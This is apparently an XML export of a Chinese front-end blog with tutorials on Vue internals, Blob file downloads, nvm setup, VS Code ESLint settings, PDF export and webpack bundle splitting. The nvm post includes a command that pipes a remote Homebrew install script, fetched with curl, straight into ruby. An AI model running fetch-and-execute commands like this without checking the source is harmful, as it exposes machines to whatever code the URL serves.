: undefined return mountComponent(this, el, hydrating)&#125;// ...export default Vue 通过import Vue from &#39;core/index&#39;,在 src/core/index.js 中： 1234567891011121314151617181920212223242526import Vue from './instance/index'import &#123; initGlobalAPI &#125; from './global-api/index'import &#123; isServerRendering &#125; from 'core/util/env'import &#123; FunctionalRenderContext &#125; from 'core/vdom/create-functional-component'initGlobalAPI(Vue)Object.defineProperty(Vue.prototype, '$isServer', &#123; get: isServerRendering&#125;)Object.defineProperty(Vue.prototype, '$ssrContext', &#123; get () &#123; /* istanbul ignore next */ return this.$vnode &amp;&amp; this.$vnode.ssrContext &#125;&#125;)// expose FunctionalRenderContext for ssr runtime helper installationObject.defineProperty(Vue, 'FunctionalRenderContext', &#123; value: FunctionalRenderContext&#125;)Vue.version = '__VERSION__'export default Vue vue定义通过import Vue from &#39;./instance/index&#39;,在 src/core/instance/index.js 中 1234567891011121314151617181920212223import &#123; initMixin &#125; from './init'import &#123; stateMixin &#125; from './state'import &#123; renderMixin &#125; from './render'import &#123; eventsMixin &#125; from './events'import &#123; lifecycleMixin &#125; from './lifecycle'import &#123; warn &#125; from '../util/index'function Vue (options) &#123; if (process.env.NODE_ENV !== 'production' &amp;&amp; !(this instanceof Vue) ) &#123; warn('Vue is a constructor and should be called with the `new` keyword') &#125; this._init(options)&#125;initMixin(Vue)stateMixin(Vue)eventsMixin(Vue)lifecycleMixin(Vue)renderMixin(Vue)export default Vue 可以看到vue是一个用 Function 实现的类，我们只能通过 new Vue 去实例化它。 initGlobalAPI(Vue)在整个初始化过程中，除了给它的原型 prototype 上扩展方法，还会给 Vue 这个对象本身扩展全局的静态方法，它的定义在 src/core/global-api/index.js 中 12345678910111213141516171819202122232425262728293031323334353637383940414243export function initGlobalAPI (Vue: GlobalAPI) &#123; // config const configDef = &#123;&#125; configDef.get = () =&gt; config if (process.env.NODE_ENV !== 'production') &#123; configDef.set = () =&gt; &#123; warn( 'Do not replace the Vue.config object, set individual fields instead.' ) &#125; &#125; Object.defineProperty(Vue, 'config', configDef) // exposed util methods. // NOTE: these are not considered part of the public API - avoid relying on // them unless you are aware of the risk. Vue.util = &#123; warn, extend, mergeOptions, defineReactive &#125; Vue.set = set Vue.delete = del Vue.nextTick = nextTick Vue.options = Object.create(null) ASSET_TYPES.forEach(type =&gt; &#123; Vue.options[type + 's'] = Object.create(null) &#125;) // this is used to identify the "base" constructor to extend all plain-object // components with in Weex's multi-instance scenarios. Vue.options._base = Vue extend(Vue.options.components, builtInComponents) initUse(Vue) initMixin(Vue) initExtend(Vue) initAssetRegisters(Vue)&#125; Vue 官网中关于全局 API 都可以在这里找到。有一点要注意的是，Vue.util 暴露的方法最好不要依赖，因为它可能经常会发生变化，是不稳定的。]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>webpack</tag>
        <tag>源码</tag>
        <tag>类型检测</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件下载]]></title>
    <url>%2F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[业务中常遇到前端下载文件的需求，简单汇总。 返回Blob下载表格123456789101112131415161718this.$http.get('***', &#123; responseType: 'blob'&#125;).then(data)&#123; let blob = new Blob([data], &#123; type: 'application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' &#125;) if (window.navigator.msSaveOrOpenBlob) &#123; navigator.msSaveBlob(blob) &#125; else &#123; let elink = document.createElement('a') elink.download = `$&#123;fileName&#125;.xls` elink.style.display = 'none' elink.href = URL.createObjectURL(blob) document.body.appendChild(elink) elink.click() document.body.removeChild(elink) &#125;&#125; 返回Blob下载pdf12345678910111213141516...let blob = new Blob([data], &#123; type: 'application/pdf;charset=UTF-8' &#125;); if (window.navigator.msSaveOrOpenBlob) &#123; navigator.msSaveBlob(blob); &#125; else &#123; let elink = document.createElement('a'); elink.download = `$&#123;fileName&#125;.pdf`; elink.style.display = 'none'; elink.href = URL.createObjectURL(blob); document.body.appendChild(elink); elink.click(); document.body.removeChild(elink); &#125;&#125;) 返回url下载12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849..._URL...// location.hreflocation.href = _URL;// window.openwindow.open(_URL);// iframelet iframe = document.createElement('iframe');iframe.style.display = 'none'; // 防止影响页面iframe.style.height = 0; // 防止影响页面iframe.src = _URL;document.body.appendChild(iframe);setTimeout(() =&gt; &#123;iframe.remove();&#125;, 60 * 1000);// bloblet Req = new XMLHttpRequest();Req.open('GET', _URL, true);Req.responseType = 'blob';Req.onload = () =&gt; &#123; var blob = new Blob([Req.response], &#123; type: 'application/pdf' &#125;); let type = blob.type; let forceSaveableType = 'application/octet-stream'; if (type &amp;&amp; type !== forceSaveableType) &#123; // 强制下载，而非在浏览器中打开 let slice = blob.slice || blob.webkitSlice || blob.mozSlice; blob = slice.call(blob, 0, blob.size, forceSaveableType); &#125; let url = URL.createObjectURL(blob); let saveLink = document.createElementNS( 'http://www.w3.org/1999/xhtml', 'a' ); saveLink.href = url; saveLink.download = '文件.pdf'; let event = new MouseEvent('click', &#123; bubbles: true, cancelable: true, view: window &#125;); saveLink.dispatchEvent(event); URL.revokeObjectURL(url);&#125;;Req.send(); 第三方具体见文档https://github.com/rndme/download。 1download('文件.pdf')]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>文件</tag>
        <tag>vue</tag>
        <tag>Blob</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nvm-Mac]]></title>
    <url>%2Fnvm-Mac%2F</url>
    <content type="text"><![CDATA[前段时间重装了下系统，就想着把nvm的安装也记录一下，便于我之后可以潇洒丢给对方一个链接，并保持自己的高冷。 简介开发环境中可能会因为node版本的问题，存在项目运行失败的问题，暂且不谈通过开发环境封装的解决方案。nvm可解决切换node版本的问题。 window用户使用nvm-Wndows，可以参考 https://luckyp.top/nvm-Windows/ 安装推荐使用homebrew安装，没有 homebrew 的可以通过以下命令安装homebrew。 1/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; 安装nvm 1brew install nvm 会出现以下提示信息 123456789101112131415yplians-MacBook-Pro:~ iyx$ brew install nvm==&gt; Downloading https://github.com/creationix/nvm/archive/v0.35.2.tar.gz==&gt; Downloading from https://codeload.github.com/nvm-sh/nvm/tar.gz/v0.35.2######################################################################## 100.0%==&gt; CaveatsPlease note that upstream has asked us to make explicit managingnvm via Homebrew is unsupported by them and you should check anyproblems against the standard nvm install method prior to reporting.You should create NVM&apos;s working directory if it doesn&apos;t exist: mkdir ~/.nvmAdd the following to ~/.bash_profile or your desired shellconfiguration file: export NVM_DIR=&quot;$HOME/.nvm&quot; [ -s &quot;/usr/local/opt/nvm/nvm.sh&quot; ] &amp;&amp; . &quot;/usr/local/opt/nvm/nvm.sh&quot; # This loads nvm [ -s &quot;/usr/local/opt/nvm/etc/bash_completion.d/nvm&quot; ] &amp;&amp; . &quot;/usr/local/opt/nvm/etc/bash_completion.d/nvm&quot; # This loads nvm bash_completion 按照提示信息 1mkdir ~/.nvm 在~/.bash_profile文件中添加 123export NVM_DIR=&quot;$HOME/.nvm&quot; [ -s &quot;/usr/local/opt/nvm/nvm.sh&quot; ] &amp;&amp; . &quot;/usr/local/opt/nvm/nvm.sh&quot; # This loads nvm [ -s &quot;/usr/local/opt/nvm/etc/bash_completion.d/nvm&quot; ] &amp;&amp; . &quot;/usr/local/opt/nvm/etc/bash_completion.d/nvm&quot; # This loads nvm bash_completion 如果没有.bash_profile 文件 12cd ~touch .bash_profile 备注：没有.bash_profile 文件，创建并添加后，需要重启终端 命令安装成功后可通过nvm -v检测 12345678910111213141516nvm list // 查看当前存在在nodenvm install node // 安装最新版本nvmnvm --help // 自行查看帮助Example: nvm install 8.0.0 Install a specific version number nvm use 8.0 Use the latest available 8.0.x release nvm run 6.10.3 app.js Run app.js using node 6.10.3 nvm exec 4.8.3 node app.js Run `node app.js` with the PATH pointing to node 4.8.3 nvm alias default 8.1.0 Set default node version on a shell nvm alias default node Always default to the latest available node version on a shell]]></content>
      <tags>
        <tag>nvm</tag>
        <tag>mac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vscode格式化eslint]]></title>
    <url>%2Fvscode%E6%A0%BC%E5%BC%8F%E5%8C%96eslint%2F</url>
    <content type="text"><![CDATA[之前使用 vue-cli3 本身自带有指令npm run lint，可以修复 eslint 报错的格式问题，甚至通过配置文件vue.config.js中的配置项lintOnSave来实现保存时自动格式化。对于格式化保持的代码风格，平时工作也很有用，可以通过配置编辑器实现。 安装插件shift+command+X唤醒扩展，或者右侧插件应用商店搜索相应插件。 ESlint：javascript 代码检测工具，可以配置每次保存时格式化 js，但每次保存只格式化一点点，你得连续按住 Ctrl+S 好几次,才格式化好 vetur：可以格式化 html、标准 css（有分号 、大括号的那种）、标准 js（有分号 、双引号的那种）、vue 文件 Prettier - Code formatter：只关注格式化，并不具有 eslint 检查语法等能力，只关心格式化文件(最大长度、混合标签和空格、引用样式等)，包括 JavaScript · Flow · TypeScript · CSS · SCSS · Less · JSX · Vue · GraphQL · JSON · Markdown 配置 vscode首选项 =&gt; 设置 =&gt; settings.json 123456789101112131415161718192021222324252627282930313233343536373839&#123; // 私货，比较喜欢的主题 "workbench.colorTheme": "One Dark Pro", // vscode默认启用了根据文件类型自动设置tabsize的选项 "editor.detectIndentation": false, // 重新设定tabsize "editor.tabSize": 2, // 每次保存的时候自动格式化 "editor.formatOnSave": true, // 每次保存的时候将代码按eslint格式进行修复 "eslint.autoFixOnSave": true, // 添加 vue 支持 "eslint.validate": [ "javascript", "javascriptreact", &#123; "language": "vue", "autoFix": true &#125; ], // 让prettier使用eslint的代码格式进行校验，eslint6暂不兼容 "prettier.eslintIntegration": true, // 去掉代码结尾的分号 "prettier.semi": false, // 使用带引号替代双引号 "prettier.singleQuote": true, // 让函数(名)和后面的括号之间加个空格 "javascript.format.insertSpaceBeforeFunctionParenthesis": true, // 按用户自身习惯选择 "vetur.format.defaultFormatter.html": "js-beautify-html", // 让vue中的js按编辑器自带的ts格式进行格式化 "vetur.format.defaultFormatter.js": "vscode-typescript", "vetur.format.defaultFormatterOptions": &#123; "js-beautify-html": &#123; "wrap_attributes": "force-aligned" // #vue组件中html代码格式化样式 &#125; &#125;&#125; 备注关于平时会用的html、css、js之类的，比较推荐使用插件Beautify,需要格式化的时候，直接打开查看 =&gt; 命令面板或者command+shift+P输入 beautify 即可（也可以自行配置启动命令）。 类似 vscode 配置https://www.jianshu.com/p/f15b67c94c78]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>编辑器</tag>
        <tag>vscode</tag>
        <tag>eslint</tag>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue轮播动画效果]]></title>
    <url>%2Fvue%E8%BD%AE%E6%92%AD%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C%2F</url>
    <content type="text"><![CDATA[本身vue有v-show这个通过改变display:none/block来实现显隐的功能，可以通过定位在同一位置，通过切换index来实现显隐。当然变化过于生硬，通过transition-group实现动画过渡效果，让其显示为左右滑动的效果。 123456789&lt;div&gt; &lt;transition-group :name="animationName" tag="ul"&gt; &lt;li v-for="(item,index) in list" class="nav-item" key="0" v-show="current == index"&gt; &#123;&#123;item&#125;&#125; &lt;/li&gt; &lt;/transition-group&gt; &lt;i class="nav_left" @click="changeCur(-1)"&gt;&lt;img src="@/assets/arrow_left.png" alt=""&gt;&lt;/i&gt; &lt;i class="nav_right" @click="changeCur(1)"&gt;&lt;img src="@/assets/arrow_right.png" alt=""&gt;&lt;/i&gt;&lt;/div&gt; 1234567891011121314151617181920export default &#123; name: 'home', data() &#123; return &#123; list:[1,2,3] &#125; &#125;, methods: &#123; changeCur(num) &#123; this.animationName = num&gt;0?'right':'left' this.current = this.current + num; if(this.current &gt;= 3)&#123; this.current = 0 &#125;else if(this.current &lt; 0)&#123; this.current = 2 &#125; &#125; &#125;,&#125;&lt;/script&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950.left-enter-active,.right-enter-active &#123; transform: translateX(0); transition: all 0.6s ease;&#125;.left-leave-active &#123; transform: translateX(100%); transition: all 0.6s ease;&#125;.left-enter &#123; transform: translateX(-100%);&#125;.left-leave,.right-leave &#123; transform: translateX(0);&#125;.right-leave-active &#123; transform: translateX(-100%); transition: all 0.6s ease;&#125;.right-enter &#123; transform: translateX(100%);&#125;.nav-item&#123; position: absolute; left: 0; right: 0; width: 100%; height:200px; color: #fff; font-size: 14px; &#125;.arrow_left&#123; position: absolute; left: 20px; top: 67px; img&#123; width: 16px; height: 16px; &#125;&#125;.arrow_right&#123; position: absolute; right: 20px; top: 67px; img&#123; width: 16px; height: 16px; &#125;&#125;]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>动画</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac解决端口占用]]></title>
    <url>%2FMac%E8%A7%A3%E5%86%B3%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%2F</url>
    <content type="text"><![CDATA[非法关闭启用的服务，再次启用时，会提示接口被占用，需要进行以下步骤。 查看端口终端输入：lsof -i tcp:port 将port换成被占用的端口(如：8080、4000) 出现一个table表格数据，将会展示占用端口的进程信息 kill进程找到进程的PID,使用kill命令：kill PID（进程的PID，如2044），杀死对映的进程]]></content>
      <tags>
        <tag>Mac</tag>
        <tag>服务</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Promise与setTimeOut]]></title>
    <url>%2FPromise%E4%B8%8EsetTimeOut%2F</url>
    <content type="text"><![CDATA[当同时存在Promise与setTimeOut时，它们的执行顺序是什么呢？ 作为浏览器或者运行环境，在拿到开发者给的JavaScript的代码后，首先要传递给JavaScript引擎，让其执行。但是JavaScript的运行，往往需要时间，这时候就需要一个认知，一个JavaScript引擎会常驻内存，等待我们将代码或者函数传递给它。 es3及之后在早期，JavaScript没有异步执行的概念，当传递代码时，往往是顺序执行宿主（浏览器）发起的任务。 es5之后，JavaScript引入了Promise，JavaScript可以发起任务，而不需要浏览器的安排。 这里浏览器发起的任务为宏观任务，JavaScript引擎发起的任务为微观任务。 宏观任务与微观任务JavaScript引擎等待宿主分配宏观任务，在操作系统中，等待行为称为事件循环。 简单来讲就是“等待” - “执行”。这里省略了判断循环是否结束，宏观队列的问题。 1234while(TRUE)&#123; r = wait(); execute(r);&#125; 每次的执行过程，就是一个宏观任务，事件的循环也可以称为宏观任务队列。在宏观任务中，JavaScript会执行Promise异步代码。JavaScript要保证代码在宏观任务里执行，因此宏观任务包含一个微观任务队列。 有了宏观任务和微观任务，就可以实现JavaScript的引擎和宿主任务了。这里，Promise永远在队列尾部添加微观任务，setTimeOut等宿主API，则添加宏观任务。 PromisePromise 是 JavaScript 语言提供的一种标准化的异步管理方式，它的总体思想是，需要进行 io、等待或者其它异步操作的函数，不返回真实结果，而返回一个“承诺”，函数的调用方可以在合适的时机，选择等待这个承诺兑现（通过 Promise 的 then 方法的回调）。 执行顺序分析： 分析几个宏观任务 确定每个宏观任务里有几个微观任务 根据调用顺序，确定微观任务执行顺序 确定宏观任务顺序 1234567891011121314151617181920212223 setTimeout(()=&gt;console.log("d"), 0) var r = new Promise(function(resolve, reject)&#123; resolve() &#125;); r.then(() =&gt; &#123; var begin = Date.now(); while(Date.now() - begin &lt; 1000); console.log("c1") new Promise(function(resolve, reject)&#123; resolve() &#125;).then(() =&gt; console.log("c2")) &#125;);// 这里就不难理解，当代码执行时，输出c1、c2、d function sleep(duration) &#123; return new Promise(function(resolve, reject) &#123; console.log("b"); setTimeout(resolve,duration); &#125;) &#125; console.log("a"); sleep(5000).then(()=&gt;console.log("c"));// a,b,c asyc/awaites6新引入的特性，其运行基础为Promise,asyc函数必须返回Promise，返回的Promise即为异步函数。 async 函数是一种特殊语法，特征是在 function 关键字之前加上 async 关键字，这样，就定义了一个 async 函数，我们可以在其中使用 await 来等待一个 Promise。 其强大之处在于可以嵌套。 1234567891011121314151617181920// 盒子绿三秒，黄1秒，红三秒//&lt;div id="light" style="background: #fff;width:10px;height:10px;"&gt;&lt;/div&gt;function sleep(duration)&#123; return new Promise(function(resolve)&#123; setTimeout(resolve, duration); &#125;)&#125;async function changeColor(duration,color)&#123; document.getElementById("light").style.background = color; await sleep(duration);&#125;async function main()&#123; while(true)&#123; await changeColor(3000,"green"); await changeColor(1000, "yellow"); await changeColor(2000, "red"); &#125;&#125;main()]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>promise</tag>
        <tag>es6</tag>
        <tag>事件循环</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[类型转换]]></title>
    <url>%2F%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[JavaScript目前有七种数据类型，分别是Undefined，NaN，Boolean，Number，Symbol，String，Object。它们之间存在隐形转换。 类型转换问题因为js是弱语言类型，所以类型转换很频繁，按照个人思维去直觉判断就会出现问题，最臭名昭著的就是“==”转换，因为其跨类型转换，其复杂规则是很难全记住的，所以往往要求通过显示转换后，在通过“===”比较。 大多数类型的规则如下 StringToNumber推荐使用Number转换。 关于parseInt、parseFloat，需要注意的是，es5后默认为第二参数转换为十进制，废除不传参数时，es3允许的0开头的八进制转换，目前为 0b11 0o17 0xff 对于1e3这一类的转换，parseInt只会支持整数，无视e及其之后的数字。 NumberToString完全符合你的直觉，很少用到。 装箱转换基础类型中Number，Boolean，Symbol，String在对象中有相应的类。将基础类型转换为相应对象为装箱。 123456789101112var symbolObject = (function()&#123; return this; &#125;).call(Symbol("a"));console.log(typeof symbolObject); //objectconsole.log(symbolObject instanceof Symbol); //trueconsole.log(symbolObject.constructor == Symbol); //truevar symbolObject = Object(Symbol("a"));console.log(typeof symbolObject); //objectconsole.log(symbolObject instanceof Symbol); //trueconsole.log(symbolObject.constructor == Symbol); //true 拆箱转换在 JavaScript 标准中，定了 ToPrimitive 函数，它是对象类型到基本类型的转换。 对象到String、Number先拆在转换 12345678910// Obj==&gt;Numbervar o = &#123; valueOf : () =&gt; &#123;console.log("valueOf"); return &#123;&#125;&#125;, toString : () =&gt; &#123;console.log("toString"); return &#123;&#125;&#125;&#125;o * 2// valueOf// toString// TypeError 12345678910// Obj==&gt;Stringvar o = &#123; valueOf : () =&gt; &#123;console.log("valueOf"); return &#123;&#125;&#125;, toString : () =&gt; &#123;console.log("toString"); return &#123;&#125;&#125;&#125;String(o)// toString// valueOf// TypeError 参考链接 https://time.geekbang.org/column/article/78884]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>String</tag>
        <tag>Number</tag>
        <tag>转换</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue导出PDF]]></title>
    <url>%2Fvue%E5%AF%BC%E5%87%BAPDF%2F</url>
    <content type="text"><![CDATA[新需求需要导出当前页面为PDF，通过Google找到了前端就可实现的一种导出方式。 依赖1234// 第一个将页面html转换成图片npm install html2canvas --save// 第二个将图片生成pdfnpm install jspdf --save 封装组件创建htmlToPdf.js,看个人习惯，本例放在src/utils/htmlToPdf.js,将其注册为插件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445// 导出页面为PDF格式import Vue from 'vue'import html2Canvas from 'html2canvas'import JsPDF from 'jspdf'/* 执行方式 参数 (导出的容器id,导出pdf文件名 ) &lt;button @click="getPdf('#pdfDom','test')"&gt;导出&lt;/button&gt;*/const htmlToPdf = &#123; install (Vue, options) &#123; Vue.prototype.getPdf = function (id,pdfTitle) &#123; var title = pdfTitle html2Canvas(document.querySelector(id), &#123; allowTaint: true, logging: false &#125;).then(function (canvas) &#123; let contentWidth = canvas.width let contentHeight = canvas.height let pageHeight = contentWidth / 592.28 * 841.89 let leftHeight = contentHeight let position = 0 let imgWidth = 595.28 let imgHeight = 592.28 / contentWidth * contentHeight let pageData = canvas.toDataURL('image/jpeg', 1.0) let PDF = new JsPDF('', 'pt', 'a4') if (leftHeight &lt; pageHeight) &#123; PDF.addImage(pageData, 'JPEG', 0, 0, imgWidth, imgHeight) &#125; else &#123; while (leftHeight &gt; 0) &#123; PDF.addImage(pageData, 'JPEG', 0, position, imgWidth, imgHeight) leftHeight -= pageHeight position -= 841.89 if (leftHeight &gt; 0) &#123; PDF.addPage() &#125; &#125; &#125; PDF.save(title + '.pdf') &#125;) &#125; &#125;&#125;Vue.use(htmlToPdf) 引用在当前项目入口文件，本例为当前vue-cli3入口文件为main.js引入,@指的当前src目录，通过webpack可自定义其它快捷。 1import '@/utils/htmlToPdf' 使用方式html使用12&lt;!-- 参数 (导出的容器id,导出pdf文件名 ) --&gt;&lt;button @click="getPdf('#pdfDom','test')"&gt;导出&lt;/button&gt; js使用1this.getPdf('#pdfDom','test')]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>pdf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue-cli3打包]]></title>
    <url>%2Fvue-cli3%E6%89%93%E5%8C%85%2F</url>
    <content type="text"><![CDATA[最近通过vue-cli3配置项目的时候，对于引入的ElementUI或者测试使用的jQuery等第三方包，存在打包之后，app.js文件过大的问题。解决的方案目前看来存在两种方式。 在vue-cli3不存在暴露的接口文件，需要通过vue.config.js配置来使用,展示的均为vue-cli3。vue-cli2类似，区别在于可在暴露的配置文件中直接添加。 webpack-bundle-analyzer用于显示打包之后的文件分析其大小. 安装npm install –save-dev webpack-bundle-analyzer 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// vue.config.js文件const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;module.exports = &#123; // configureWebpack返回一个对象，会被 webpack-merge合并最终配置 configureWebpack: config =&gt; &#123; if (process.env.NODE_ENV === 'production') &#123; // 为生产环境修改配置... return &#123; plugins: [ new BundleAnalyzerPlugin( // 可以是`server`，`static`或`disabled`。 // 在`server`模式下，分析器将启动HTTP服务器来显示软件包报告。 // 在“静态”模式下，会生成带有报告的单个HTML文件。 // 在`disabled`模式下，你可以使用这个插件来将`generateStatsFile`设置为`true`来生成Webpack Stats JSON文件。 analyzerMode: 'server', // 将在“服务器”模式下使用的主机启动HTTP服务器。 analyzerHost: '127.0.0.1', // 将在“服务器”模式下使用的端口启动HTTP服务器。 analyzerPort: 8888, // 路径捆绑，将在`static`模式下生成的报告文件。 // 相对于捆绑输出目录。 reportFilename: 'report.html', // 模块大小默认显示在报告中。 // 应该是`stat`，`parsed`或者`gzip`中的一个。 // 有关更多信息，请参见“定义”一节。 defaultSizes: 'parsed', // 在默认浏览器中自动打开报告 openAnalyzer: true, // 如果为true，则Webpack Stats JSON文件将在bundle输出目录中生成 generateStatsFile: false, // 如果`generateStatsFile`为`true`，将会生成Webpack Stats JSON文件的名字。 // 相对于捆绑输出目录。 statsFilename: 'stats.json', // stats.toJson（）方法的选项。 // 例如，您可以使用`source：false`选项排除统计文件中模块的来源。 // 在这里查看更多选项：https： //github.com/webpack/webpack/blob/webpack-1/lib/Stats.js#L21 statsOptions: null, logLevel: 'info' //日志级别。可以是'信息'，'警告'，'错误'或'沉默'。 ) ] &#125; &#125; else &#123; // 为开发环境修改配置... &#125; &#125;&#125; 默认在打包或者运行server时，接口8888为图像界面。 通过externalswebpack文档https://webpack.docschina.org/configuration/externals有简单的介绍。简单来说就是 1.添加cdn在模板页面index.html中添加CDN链接，举例jQuery。&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt; 2.设置externals12345678910111213141516171819// vue.config.js文件const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;module.exports = &#123; configureWebpack: config =&gt; &#123; if (process.env.NODE_ENV === 'production') &#123; // 为生产环境修改配置... return &#123; plugins: [ new BundleAnalyzerPlugin() ], externals:&#123; 'jquery': 'jQuery' &#125; &#125; &#125; else &#123; // 为开发环境修改配置... &#125; &#125;&#125; 3.关于开发时引用可以通过下面代码引用，此时（上例设置为生产环境时）不会被webpack打包。同时可以引用使用。 1import $ from 'jquery'; 通过splitChunks上一种方式是通过cdn加速，这种是通过拆分Chunk的方式。webpac中文文档地址https://webpack.docschina.org/plugins/split-chunks-plugin/，webpack4默认删除CommonsChunkPlugin。直接上代码 1234567891011121314151617181920212223242526272829303132// vue.config.js文件const BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;module.exports = &#123; configureWebpack: config =&gt; &#123; if (process.env.NODE_ENV === 'production') &#123; // 为生产环境修改配置... return &#123; optimization:&#123; splitChunks:&#123; cacheGroups: &#123; libs: &#123; name: "chunk-libs",// 只打包初始时依赖的第三方 test: /[\\/]node_modules[\\/]/, priority: 10, chunks: "initial" &#125;, elementUI: &#123; name: "chunk-elementUI", // 单独将 elementUI 拆包 priority: 20, // 权重要大于 libs 和 app 不然会被打包进 libs 或者 app test: /[\\/]node_modules[\\/]element-ui[\\/]/, chunks: "all" &#125; &#125; &#125;, runtimeChunk: true &#125;, &#125; &#125; else &#123; // 为开发环境修改配置... &#125; &#125;&#125; 参考链接vue-cli2参考https://blog.csdn.net/LY_never_cease/article/details/81333093]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>脚手架</tag>
        <tag>webpack</tag>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue数据双向绑定]]></title>
    <url>%2Fvue%E6%95%B0%E6%8D%AE%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A%2F</url>
    <content type="text"><![CDATA[前段时间的react项目，通过最近的闲暇时间，重构了一版vue的PC版本，备用链接,对于vue的数据双向绑定产生，探讨一下。 几种绑定方式发布者-订阅者模式（backbone.js）通过自定义的data属性在HTML代码中指明绑定。所有绑定起来的JavaScript对象以及DOM元素都将“订阅”一个发布者对象。任何时候如果JavaScript对象或者一个HTML输入字段被侦测到发生了变化，我们将代理事件到发布者-订阅者模式，这会反过来将变化广播并传播到所有绑定的对象和元素。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;input type="text" data-bind-123="name" /&gt;&lt;div data-bind-123="name"&gt;&lt;/div&gt;&lt;script&gt;function DataBinder(object_id)&#123; //创建一个简单地PubSub对象 var pubSub = &#123; callbacks: &#123;&#125;, // 订阅事件 on:function(msg, callback)&#123; this.callbacks[msg] = this.callbacks[msg] || []; this.callbacks[msg].push(callback); &#125;, // 发布事件 publish: function(msg)&#123; this.callbacks[msg] = this.callbacks[msg] || []; for(var i=0, len=this.callbacks[msg].length; i&lt;len; i++)&#123; this.callbacks[msg][i].apply(this,arguments); &#125; &#125; &#125;, data_attr = "data-bind-" + object_id, message = object_id + ":input", changeHandler = function(evt)&#123; var target = evt.target || evt.srcElemnt, //IE8兼容 prop_name = target.getAttribute(data_attr); if(prop_name &amp;&amp; prop_name !== "")&#123; pubSub.publish(message, prop_name, target.value); &#125; &#125;; //监听变化事件并代理到PubSub if(document.addEventListener)&#123; document.addEventListener("input",changeHandler,false); &#125; //PubSub将变化传播到所有绑定元素 pubSub.on(message,function(vet,prop_name,new_val)&#123; var elements = document.querySelectorAll("[" + data_attr + "=" + prop_name + "]"), tah_name; for(var i = 0,len =elements.length; i &lt; len; i++)&#123; tag_name = elements[i].tagName.toLowerCase(); if(tag_name === "input" || tag_name === "textarea" || tag_name === "select")&#123; elements[i].value = new_val; &#125;else&#123; elements[i].innerHTML = new_val; &#125; &#125; &#125;); return pubSub;&#125;function User(uid)&#123; var binder = new DataBinder(uid), user = &#123; atttibutes: &#123;&#125;, //属性设置器使用数据绑定器PubSub来发布变化 set: function(attr_name,val)&#123; this.atttibutes[attr_name] = val; //使用“publish”方法 binder.publish(uid+ ":input", attr_name, val,this); &#125;, get: function(attr_name)&#123; return this.atttibutes[attr_name]; &#125;, binder: binder &#125;; binder.on(uid +":input",function(vet,attr_name,new_val,initiator)&#123; if(initiator !== user)&#123; user.set(attr_name,new_val); &#125; &#125;) return user;&#125;var user = new User(123);user.set("name","Wolfgang");&lt;/script&gt; 脏值检查（angular.js）angular.js 是通过脏值检测的方式比对数据是否有变更，来决定是否更新视图，最简单的方式就是通过 setInterval() 定时轮询检测数据变动，angular只有在指定的事件触发时进入脏值检测，大致如下： DOM事件，譬如用户输入文本，点击按钮等。( ng-click ) XHR响应事件 ( $http ) 浏览器Location变更事件 ( $location ) Timer事件( $timeout , $interval ) 执行 $digest() 或 $apply() 数据劫持（Vue.js）vue.js 则是采用数据劫持结合发布者-订阅者模式的方式，通过Object.defineProperty()来劫持各个属性的setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。 官方介绍vue当前使用的版本为v2.5.2，官方文档的相关内容是关于深入响应式原理。 当你把一个普通的 JavaScript 对象传给 Vue 实例的 data 选项，Vue 将遍历此对象所有的属性，并使用 Object.defineProperty 把这些属性全部转为 getter/setter。Object.defineProperty 是 ES5 中一个无法 shim 的特性，这也就是为什么 Vue 不支持 IE8 以及更低版本浏览器。这些 getter/setter 对用户来说是不可见的，但是在内部它们让 Vue 追踪依赖，在属性被访问和修改时通知变化。这里需要注意的问题是浏览器控制台在打印数据对象时 getter/setter 的格式化并不同，所以你可能需要安装 vue-devtools 来获取更加友好的检查接口。每个组件实例都有相应的 watcher 实例对象，它会在组件渲染的过程中把属性记录为依赖，之后当依赖项的 setter 被调用时，会通知 watcher 重新计算，从而致使它关联的组件得以更新。 实现原理实现当EventListener监听的事件触发，状态发生改变时，通过Object.defineProperty的get/set拦截事件，从而实现数据的双向绑定。 